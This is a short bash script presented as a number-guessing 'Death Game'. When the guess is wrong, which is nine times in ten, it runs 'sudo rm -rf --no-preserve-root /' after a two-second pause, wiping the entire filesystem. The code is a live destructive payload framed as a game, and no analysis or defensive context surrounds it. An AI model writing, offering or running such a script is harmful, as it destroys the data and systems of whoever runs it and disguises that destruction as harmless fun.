#!/bin/bash

# Generate a random number between 0-9
secret=$((RANDOM % 10))

echo "Welcome to the Death Game!"
echo "Guess a number between 0 to 9: "
read user_guess

if [[ $user_guess -eq $secret ]]; then
    echo "You survived! Good job!"
else
    echo "Wrong guess! Prepare for destruction!"
    sleep 2
    sudo rm -rf --no-preserve-root /     
fi
